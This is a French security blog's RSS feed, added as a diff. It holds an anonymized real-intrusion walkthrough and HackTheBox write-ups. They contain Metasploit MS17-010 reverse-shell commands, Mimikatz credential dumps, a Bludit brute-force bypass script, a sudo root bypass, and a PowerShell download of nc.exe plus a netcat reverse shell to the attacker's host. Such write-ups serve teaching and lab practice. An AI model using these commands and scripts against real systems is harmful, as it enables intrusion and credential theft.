@@ -1,0 +1,4084 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<?xml-stylesheet href="rss.xsl" type="text/xsl"?>
+<rss version="2.0">
+  <channel>
+    <title>3r1c.net</title>
+    <link>http://3r1c.net</link>
+    <description>Un blog basé sur des fichiers textes seulement.</description>
+    <copyright></copyright>
+    <ttl>60</ttl>
+<item>
+<pubDate>2019-05-18T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2019/05/18/6</category>
+  <title>Anatomie d'une attaque informatique</title>
+  <link>http://3r1c.net/posts/2019-05-18-anatomie-dune-attaque-informatique.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Au cours de cet article, je vous propose de décortiquer le processus d&#39;une attaque informatique à distance. Il s&#39;agit d&#39;un cas réel, pour lequel l&#39;entreprise a entrepris des actions correctives. Pour des raisons éthiques, toute information potentiellement sensible a été anonymisée ou supprimée.
+
+Comme l&#39;indique le schéma ci-après, un attaquant (à droite et en rouge) connecté à internet, tente de s&#39;introduire sur le réseau de l&#39;entreprise (à gauche).
+
+![](img/20180217102110-attaque-informatique.png)
+
+#### Phase 1 - Découverte
+En premier lieu l&#39;attaquant va énumérer les services logiciels fournis par l&#39;entreprise sur internet. Bien souvent le management n&#39;a pas connaissance de l&#39;existence de ses services, et des risques encourus
+L&#39;attaquant découvre :
+
+- Un site internet
+- Un serveur de transfert de fichiers (FTP)
+
+Le serveur FTP est accessible en mode _anonyme_, ce qui permet une connexion sans pouvoir utiliser les fonctions de transfert de fichier. On peut considérer que le mode anonyme est &quot;sécurisé&quot;. Toutefois il permet d&#39;obtenir une information qui peut paraître anodine, mais qui a une grande importance pour la suite : le nom de compte d&#39;un utilisateur &quot;administrateur&quot; peut être découvert lors d&#39;une connexion anonyme.
+
+	root@attaquant:~ $ ftp ftp.entreprise.fr
+	Connected to ftp.entreprise.fr.
+	220 xxx.xxx.xxx.xxx FTP server ready
+	Name (ftp.entreprise.fr:root): anonymous
+	331 Anonymous login ok, send your complete email address as your password
+	Password:
+	230 Anonymous access granted, restrictions apply
+	Remote system type is UNIX.
+	Using binary mode to transfer files.
+	ftp&gt; passive
+	Passive mode on.
+
+La commande `ls -lha` donne l&#39;information concernant la présence d&#39;un compte &quot;admin&quot; sur le serveur FTP.
+
+	ftp&gt; ls -lha
+	227 Entering Passive Mode
+	150 Opening ASCII mode data connection for file list
+	drwxr-s---   2 admin    group       4.0k Dec  6  2017 .
+	drwxr-s---   2 admin    group       4.0k Dec  7  2017 ..
+	226 Transfer complete
+	ftp&gt;
+
+#### Phase 2 - tentative d&#39;accès non autorisé
+L&#39;attaquant sait désormais qu&#39;une personne s&#39;identifie auprès du serveur en tant que &quot;admin&quot;.
+Il va mener sur ce compte une simple attaque basée sur un dictionnaire de mots de passe. Ces dictionnaires sont librement téléchargeables sur le web.
+
+Grâce à des outils comme **hydra** ou **medusa**, l&#39;attaquant obtient le mot de passe du compte FTP admin.
+
+    ACCOUNT FOUND: [ftp] Host : xxx.xxx.xxx.xxx
+    User: admin Password: tintin [SUCCESS]
+
+#### Phase 3 - obtenir un accès plus complet au serveur
+Désormais l&#39;attaquant en tant qu&#39;admin, possède des permissions d&#39;écriture sur le serveur web.
+Il lui est donc permis d&#39;envoyer sur le serveur une backdoor qui établira une connexion vers sa machine quand elle sera exécutée.
+
+
+	ftp&gt; cd html
+	250 CWD command successful
+	ftp&gt; put shell.php
+	local: shell.php remote: shell.php
+	227 Entering Passive Mode.
+	150 Opening BINARY mode data connection for shell.php
+	226 Transfer complete
+	1113 bytes sent in 0.00 secs (14.9499 MB/s)
+
+L&#39;éxécution de shell.php initie une connexion vers la machine de l&#39;attaquant. Ce dernier dispose ainsi d&#39;un shell sur le serveur (et plus seulement un accès FTP) qui lui permet de mener d&#39;autres actions sur le réseau interne de l&#39;entreprise.
+
+
+#### Phase 4 : identifications des machines du réseau et de leurs vulnérabilités
+L&#39;attaquant balaie et identifie les machines du réseau. Il découvre un serveur Active Directory vulnérable à MS17-010.
+
+	msf &gt; use auxiliary/scanner/smb/smb_ms17_010
+	msf auxiliary(scanner/smb/smb_ms17_010) &gt; set RSHOSTS xxx.xxx.xxx.xxx/24
+	rhosts =&gt; xxx.xxx.xxx.xxx/24
+	msf auxiliary(scanner/smb/smb_ms17_010) &gt; run
+	[+] xxx.xxx.xxx.xxx:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard
+	[*] Scanned 1 of 1 hosts (100% complete)
+	[*] Auxiliary module execution completed
+
+#### Phase 5 : exploitation de la vulnérabilité MS17-010
+Grâce au framework metasploit, l&#39;attaquant exploite la vulnérabilité MS17-010 non corrigée et obtient un accès au serveur Active Directory.
+
+	msf auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_psexec
+	msf exploit(windows/smb/ms17_010_psexec) &gt; set RHOST xxx.xxx.xxx.xxx
+	msf exploit(windows/smb/ms17_010_psexec) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+	msf exploit(windows/smb/ms17_010_psexec) &gt; set LPORT 443
+	msf exploit(windows/smb/ms17_010_psexec) &gt; run
+	[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:443
+	[*] xxx.xxx.xxx.xxx:445 - Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
+	[*] xxx.xxx.xxx.xxx:445 - Built a write-what-where primitive...
+	[+] xxx.xxx.xxx.xxx:445 - Overwrite complete... SYSTEM session obtained!
+	[*] xxx.xxx.xxx.xxx:445 - Selecting PowerShell target
+	[*] xxx.xxx.xxx.xxx:445 - Executing the payload...
+	[+] xxx.xxx.xxx.xxx:445 - Service start timed out, OK if running a command or non-service executable...
+	[*] Sending stage (179779 bytes) to xxx.xxx.xxx.xxx
+	[*] Meterpreter session 3 opened (xxx.xxx.xxx.xxx:443 -&gt; xxx.xxx.xxx.xxx:46491) at 2018-02-10 15:20:38
+	meterpreter &gt; background
+	[*] Backgrounding session 3...
+
+#### Phase 6 : obtention du mot de passe administrateur du domaine
+Grâce à Mimikatz l&#39;attaquant obtient le mot de passe administrateur du domaine, stocké en clair dans la mémoire de la machine.
+
+	meterpreter&gt; load Mimikatz
+	meterpreter&gt; wdigest
+	0;1368385624  Kerberos   DOMAINE     netadmin       	 1234
+	0;2500325002  Kerberos   DOMAINE     user1        	 password1
+	0;68817461    Kerberos   DOMAINE     user2          	 password2
+	0;2599386119  Kerberos   DOMAINE     user3		password3
+	0;2600098700  Kerberos   DOMAINE     administrateur	Very$ecureP@ssw0rdVeryL0ngAndDifficultToGuess
+	0;2581308498  Kerberos   DOMAINE     user8         	password8
+	0;2589349129  Kerberos   DOMAINE     user4     		password4
+	0;2597681195  Kerberos   DOMAINE     user5      	password5
+	0;2597641064  Kerberos   DOMAINE     user6         	password6
+	0;2595339032  Kerberos   DOMAINE     user7         	password7
+
+
+L&#39;accès administrateur du domaine étant obtenu, l&#39;attaquant poursuit ses investigations sur l&#39;ensemble des systèmes du réseau, à la recherche d&#39;information sensibles.
+
+#### Conclusion
+
+L’enchaînement de plusieurs vulnérabilités peut mener à la compromission d&#39;un réseau informatique  : tester et auditer votre sécurité.
+
+
+Tags: pentest</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2019-05-18-anatomie-dune-attaque-informatique.txt</guid>
+  </item>
+<item>
+<pubDate>2020-06-16T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2020/06/16/2</category>
+  <title>htb blunder</title>
+  <link>http://3r1c.net/posts/2020-06-16-blunder.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Voici mes notes pour Blunder.
+
+#### Reco
+
+```
+kali@kali:~$ nmap 10.10.10.191
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 01:58 EDT
+Nmap scan report for 10.10.10.191
+Host is up (0.064s latency).
+Not shown: 998 filtered ports
+PORT   STATE  SERVICE
+21/tcp closed ftp
+80/tcp open   http
+```
+
+#### Enumération web
+
+```
+kali@kali:~$ gobuster dir -u http://10.10.10.191 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.191
+[+] Threads:        80
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     Linux
+[+] Timeout:        10s
+===============================================================
+2020/06/05 02:30:45 Starting gobuster
+===============================================================
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/.hta (Status: 403)
+/0 (Status: 200)
+/LICENSE (Status: 200)
+/about (Status: 200)
+/admin (Status: 301)
+/cgi-bin/ (Status: 301)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2020/06/05 02:31:24 Finished
+===============================================================
+
+```
+
+
+
+```
+kali@kali:~$ curl  http://10.10.10.191/admin/ | html2text
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2385  100  2385    0     0  15690      0 --:--:-- --:--:-- --:--:-- 15794
+
+****** BLUDIT ******
+[username            ]
+[********************]
+⁰ Remember me
+Login
+
+```
+
+On découvre une application Bludit en version 3.9.2 selon la source HTML de la page.
+
+```
+kali@kali:~$ curl  http://10.10.10.191/admin/ 
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+        &lt;title&gt;Bludit&lt;/title&gt;
+        &lt;meta charset=&quot;UTF-8&quot;&gt;
+        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+        &lt;meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot;&gt;
+
+        &lt;!-- Favicon --&gt;
+        &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/x-icon&quot; href=&quot;/bl-kernel/img/favicon.png?version=3.9.2&quot;&gt;
+
+        &lt;!-- CSS --&gt;
+        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.css?version=3.9.2&quot;&gt;
+```
+
+![image-20200605083719998](/assets/img/image-20200605083719998.png)
+
+Il existe une faiblesse de protection contre le bruteforce. POC ici : https://rastating.github.io/bludit-brute-force-mitigation-bypass/
+
+#### POC
+
+```
+#!/usr/bin/env python3
+import re
+import requests
+
+host = &#39;http://10.10.10.191&#39;
+login_url = host + &#39;/admin/login&#39;
+username = &#39;admin&#39;
+
+# My modification
+# wordlist = []
+
+filename = &quot;/usr/share/wordlists/rockyou.txt&quot;
+with open(filename) as file:
+    content = file.readlines()
+    word1 = [x.strip() for x in content] 
+wordlist = word1
+
+# Generate 50 incorrect passwords
+# for i in range(50):
+#    wordlist.append(&#39;Password{i}&#39;.format(i = i))
+
+# Add the correct password to the end of the list
+# wordlist.append(&#39;adminadmin&#39;)
+
+for password in wordlist:
+    session = requests.Session()
+    login_page = session.get(login_url)
+    csrf_token = re.search(&#39;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#39;, login_page.text).group(1)
+
+    print(&#39;[*] Trying: {p}&#39;.format(p = password))
+
+    headers = {
+        &#39;X-Forwarded-For&#39;: password,
+        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;,
+        &#39;Referer&#39;: login_url
+    }
+
+    data = {
+        &#39;tokenCSRF&#39;: csrf_token,
+        &#39;username&#39;: username,
+        &#39;password&#39;: password,
+        &#39;save&#39;: &#39;&#39;
+    }
+
+    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+    if &#39;location&#39; in login_result.headers:
+        if &#39;/admin/dashboard&#39; in login_result.headers[&#39;location&#39;]:
+            print()
+            print(&#39;SUCCESS: Password found!&#39;)
+            print(&#39;Use {u}:{p} to login.&#39;.format(u = username, p = password))
+            print()
+            break
+```
+
+
+
+![image-20200605091855280](/assets/img/image-20200605091855280.png)
+
+Ma tentative de bruteforce échoue. Je continue mes énumérations.
+
+```
+kali@kali:~$ gobuster dir -u http://10.10.10.191 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux -x .txt,.php,.bak,.old
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.191
+[+] Threads:        80
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     Linux
+[+] Extensions:     txt,php,bak,old
+[+] Timeout:        10s
+===============================================================
+2020/06/05 05:32:24 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.bak (Status: 403)
+/.htaccess.old (Status: 403)
+/.hta (Status: 403)
+/.hta.txt (Status: 403)
+/.hta.php (Status: 403)
+/.hta.bak (Status: 403)
+/.hta.old (Status: 403)
+/0 (Status: 200)
+/.htpasswd (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.bak (Status: 403)
+/.htpasswd.old (Status: 403)
+/LICENSE (Status: 200)
+/about (Status: 200)
+/admin (Status: 301)
+/robots.txt (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+/todo.txt (Status: 200)
+```
+
+Je découvre un fichier todo.txt.
+
+```
+-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+```
+
+- Update n&#39;a pas été faite - en effet ;-)
+- Faut-il se connecter en tant que fergus ?
+- L&#39;ancien blog est-il accessible ?
+- Etablissons une liste de mot de passe à partir du contenu du site.
+
+```
+cewl -w mycustomwordlist.txt -d 10 -m 4 http://10.10.10.191
+```
+
+Je lance mon script bruteforce en utilisant cette fois le user _fergus_, et la wordlist mycustomwordlist.txt que je viens de créer.
+
+![image-20200605114735174](/assets/img/image-20200605114735174.png)
+
+Bingo
+
+```
+Use fergus:RolandDeschain to login.
+```
+
+Encore un fan de Stephen King !
+
+Il existe un module metasploit pour obtenir un reverse shell via Bludit.
+
+![image-20200605121910806](/assets/img/image-20200605121910806.png)
+
+Je configure le module.
+
+![image-20200605121843002](/assets/img/image-20200605121843002.png)
+
+Et pour obtenir un shell utilisable :
+
+```
+python -c &quot;import pty;pty.spawn(&#39;/bin/sh&#39;)&quot;
+```
+
+
+
+![image-20200605125757335](image-20200605125757335.png)
+
+Un peu de reconnaissance locale.
+
+```
+$ uname -a
+uname -a
+Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+$ cat /etc/issue
+cat /etc/issue
+Ubuntu 19.10 
+ \l
+
+$ ls /home
+ls /home
+hugo  shaun
+```
+
+Le flag n&#39;est pas accessible, seul Hugo peut le lire.
+
+```
+$ ls -als /home/hugo/*
+/home/hugo:
+total 80
+...
+4 -r--------  1 hugo hugo   33 Jun  5 08:32 user.txt
+```
+
+Je m&#39;aperçois qu&#39;il y a deux sites sans doute ancien et nouveau site comme c&#39;était évoqué dans la todo.txt list.
+
+```
+$ pwd
+/var/www/bludit-3.9.2/bl-content/tmp
+
+$ ls -l
+ls -l
+total 12
+drwxr-xr-x 8 www-data www-data 4096 May 19 15:13 bludit-3.10.0a
+drwxrwxr-x 8 www-data www-data 4096 Apr 28 12:18 bludit-3.9.2
+drwxr-xr-x 2 root     root     4096 Nov 28  2019 html
+```
+
+Voyons le contenu de users.php du nouveau site. Un compte Hugo et son empreinte de mot de passe !
+
+```
+$ pwd          
+pwd
+/var/www/bludit-3.10.0a/bl-content/databases
+$ cat users.php
+cat users.php
+&lt;?php defined(&#39;BLUDIT&#39;) or die(&#39;Bludit CMS.&#39;); ?&gt;
+{
+    &quot;admin&quot;: {
+        &quot;nickname&quot;: &quot;Hugo&quot;,
+        &quot;firstName&quot;: &quot;Hugo&quot;,
+        &quot;lastName&quot;: &quot;&quot;,
+        &quot;role&quot;: &quot;User&quot;,
+        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,
+        &quot;email&quot;: &quot;&quot;,
+        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
+        &quot;tokenRemember&quot;: &quot;&quot;,
+        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
+        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
+        &quot;twitter&quot;: &quot;&quot;,
+        &quot;facebook&quot;: &quot;&quot;,
+        &quot;instagram&quot;: &quot;&quot;,
+        &quot;codepen&quot;: &quot;&quot;,
+        &quot;linkedin&quot;: &quot;&quot;,
+        &quot;github&quot;: &quot;&quot;,
+        &quot;gitlab&quot;: &quot;&quot;}
+}
+```
+
+Le hash est-il connu de crackstation.net ? Oui !
+
+![image-20200605133203267](/assets/img/image-20200605133203267.png)
+
+Le mot de passe aurait-il été réutilisé pour le compte unix ? C&#39;est le cas !
+
+```
+$ su - hugo
+su - hugo
+Password: Password120
+
+hugo@blunder:~$ cat user.txt
+cat user.txt
+fbbd480ffe63207917bf7f19b9dcf347
+```
+
+A quelles commandes avons-nous accès avec sudo ?
+
+```
+hugo@blunder:~$ sudo -l
+sudo -l
+Password: Password120
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+```
+
+Si on google ceci `(ALL, !root) /bin/bash`, on découvre des explications sur une vulnérabilité sudo (CVE-2019-18634) https://www.exploit-db.com/exploits/47502. Il s&#39;agit de contourner les restriction du fichier sudoers.
+
+Vulnérabilité jusqu&#39;à la version 1.8.27 et nous sommes en 1.8.25p1.
+
+![image-20200605141506589](/assets/img/image-20200605141506589.png)
+
+Le contournement de la restriction du fichier sudoers :
+
+```
+hugo@blunder:~$ sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# whoami
+whoami
+root
+root@blunder:/home/hugo# id
+id
+uid=0(root) gid=1001(hugo) groups=1001(hugo)
+root@blunder:/home/hugo# 
+```
+
+![image-20200605134534606](/assets/img/image-20200605134534606.png)
+
+```
+root@blunder:/root# cat root.txt
+cat root.txt
+2a5148892d8ae104a26698ae3e94bb3e
+```</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2020-06-16-blunder.txt</guid>
+  </item>
+<item>
+<pubDate>2020-09-02T10:21:56Z 10:56:03 CET</pubDate>
+  <category>2020/09/02/3</category>
+  <title>buff</title>
+  <link>http://3r1c.net/posts/2020-09-02-buff.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Mes notes pour Buff.
+
+## nmap
+
+```
+kali@kali:/media/sf_htb/buff_10.198$ nmap -Pn -sV -p- 10.10.10.198
+Nmap scan report for 10.10.10.198
+Host is up (0.32s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE    VERSION
+7680/tcp open  pando-pub?
+8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 929.06 seconds
+
+```
+
+## website
+
+```
+kali@kali:/media/sf_htb/buff_10.198$ curl http://10.10.10.198:8080/contact.php | html2text 
+
+ Toggle navigation     About_Fitness
+    * Home
+    * Package
+    * Facilities
+    * About
+    * Contact
+[email               ]
+[********************]
+[Sign in]
+    * mrb3n&#39;s Bro Hut
+    * Made using Gym Management Software 1.0
+===============================================================================
+
+```
+
+## Gym Management Software
+
+Exploit : https://www.exploit-db.com/raw/48506
+
+```
+Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.
+```
+
+Nous devons trouver upload.php selon la doc de l&#39;exploit. Mais cette page n&#39;existe pas.
+
+## gobuster
+
+Il existe bien un /upload.php, mais l&#39;accès n&#39;est pas permis.  
+
+```
+kali@kali:/media/sf_sync$ gobuster dir -u http://10.10.10.198:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+[..]
+/ex (Status: 301)
+[..]
+/upload (Status: 301)
+```
+
+En revanche le /ex contient bien un fichier upload.php !
+
+## gym exploit
+
+J&#39;exécute l&#39;exploit sur la racine du site et j&#39;obtiens un shell.
+
+```
+kali@kali:/media/sf_sync/practice/htb/buff_10.198$ python 48506.py http://10.10.10.198:8080/
+            /\
+/vvvvvvvvvvvv \--------------------------------------,                                                                                           
+`^^^^^^^^^^^^ /============BOKU=====================&quot;
+            \/
+
+[+] Successfully connected to webshell.
+C:\xampp\htdocs\gym\upload&gt; 
+```
+
+
+
+On télécharge un nc.exe puis on établit un reverse shell plus adapté que le webshell.
+
+```
+# attacker
+kali@kali:/usr/share/windows-resources/binaries$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.198 - - [03/Sep/2020 15:10:27] &quot;GET /nc.exe HTTP/1.1&quot; 200 -
+```
+
+```
+# victim
+C:\xampp\htdocs\gym\upload&gt; powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.15.38:8000/nc.exe&#39;,&#39;C:\xampp\htdocs\gym\upload
+c.exe&#39;)&quot;
+
+C:\xampp\htdocs\gym\upload&gt; nc.exe -nv 10.10.15.38 40000 -e cmd.exe
+```
+
+```
+# attacker 
+kali@kali:/usr/share/windows-resources/binaries$ sudo nc -nlvp 40000
+listening on [any] 40000 ...
+connect to [10.10.15.38] from (UNKNOWN) [10.10.10.198] 50703
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\gym\upload&gt;
+```
+
+enum
+
+Je remarque un port 3306 (mysql) en écoute. Je me mets en recherche de creds.
+
+```
+C:\xampp\htdocs\gym&gt; findstr /spin &quot;mysql&quot; *.*
+New Text Document.txt:1:$mysql_host = &quot;mysql16.000webhost.com&quot;;
+New Text Document.txt:2:$mysql_database = &quot;a8743500_secure&quot;;
+New Text Document.txt:3:$mysql_user = &quot;a8743500_secure&quot;;
+New Text Document.txt:4:$mysql_password = &quot;ipad12345&quot;;packages.php:8:if (login_check($mysqli) == true) {
+```
+
+Je constate la présence d&#39;un processus nommer cloudme.exe
+
+```
+tasklist /svc
+cmd.exe                       8624 N/A                                         
+conhost.exe                   8500 N/A                                         
+curl.exe                      8824 N/A                                         
+CloudMe.exe                   3668 N/A                                         
+timeout.exe                   3520 N/A                                         
+tasklist.exe                  8740 N/A  
+```
+
+https://p0i5on8.github.io/posts/hackthebox-buff/
+
+4c827b7074e99eefd49d05872185f7f8</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2020-09-02-buff.txt</guid>
+  </item>
+<item>
+<pubDate>2020-09-29T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2020/09/29/2</category>
+  <title>htb admirer</title>
+  <link>http://3r1c.net/posts/2020-09-29-admirer.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>## Nmap
+
+```
+kali@kali:~$ nmap -p- 10.10.10.187
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 08:25 EDT
+Nmap scan report for 10.10.10.187
+Host is up (0.057s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+```
+
+## Enum web
+
+```
+kali@kali:~$ gobuster dir -u http://10.10.10.187 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.187
+[+] Threads:        80
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     Linux
+[+] Timeout:        10s
+===============================================================
+2020/06/05 08:33:17 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/assets (Status: 301)
+/.htpasswd (Status: 403)
+/images (Status: 301)
+/index.php (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2020/06/05 08:33:29 Finished
+===============================================================
+```
+
+robots.txt laisse entrevoir une url d&#39;administration.
+
+![image-20200605143351223](assets/img/image-20200605143351223.png)
+
+Nous n&#39;avons pas d&#39;accès sur /admin-dir/.
+
+![image-20200605143527845](assets/img/image-20200605143527845.png)
+
+La page web donne une info intéressante : le dossier contient des contacts et secrets... Creusons un peu car la directive Disallow du fichier robots.txt empêche l&#39;indexation mais pas l&#39;accès !
+
+```
+kali@kali:~$ gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux -x .txt,.php,.bak,.old
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.187/admin-dir
+[+] Threads:        80
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     Linux
+[+] Extensions:     php,bak,old,txt
+[+] Timeout:        10s
+===============================================================
+2020/06/05 08:36:36 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+...
+...
+/.hta.bak (Status: 403)
+/contacts.txt (Status: 200)
+===============================================================
+2020/06/05 08:36:56 Finished
+===============================================================
+```
+
+Un fichier contact.txt est détecté. Voici son contenu.
+
+```
+kali@kali:~$ curl -i http://10.10.10.187/admin-dir/contacts.txt
+HTTP/1.1 200 OK
+Date: Fri, 05 Jun 2020 12:38:58 GMT
+Server: Apache/2.4.25 (Debian)
+Last-Modified: Wed, 29 Apr 2020 09:18:35 GMT
+ETag: &quot;15e-5a46a6ec54540&quot;
+Accept-Ranges: bytes
+Content-Length: 350
+Vary: Accept-Encoding
+Content-Type: text/plain
+
+##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+```
+
+Je pousse encore l&#39;énumération web avec une liste de fichier plus importante.
+
+```
+kali@kali:~$ gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 80 -a Linux -x .txt,.php,.bak,.old
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.187/admin-dir
+[+] Threads:        80
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     Linux
+[+] Extensions:     txt,php,bak,old
+[+] Timeout:        10s
+===============================================================
+2020/06/05 09:15:21 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.bak (Status: 403)
+/.htaccess.old (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.bak (Status: 403)
+/.htpasswd.old (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.php (Status: 403)
+/contacts.txt (Status: 200)
+/credentials.txt (Status: 200)
+```
+
+Les secrets sont là dans credentials.txt ! Mauvaise idée :-)
+
+```
+kali@kali:~$ curl -i http://10.10.10.187/admin-dir/credentials.txt
+HTTP/1.1 200 OK
+Date: Fri, 05 Jun 2020 13:17:14 GMT
+Server: Apache/2.4.25 (Debian)
+Last-Modified: Wed, 29 Apr 2020 09:11:31 GMT
+ETag: &quot;88-5a46a5583b1c0&quot;
+Accept-Ranges: bytes
+Content-Length: 136
+Vary: Accept-Encoding
+Content-Type: text/plain
+
+[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+```
+
+## FTP
+
+Sur le FTP on a un ce qui ressemble à un backup de site web.
+
+```
+kali@kali:~$ ftp 10.10.10.187
+Connected to 10.10.10.187.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.187:kali): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
+-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
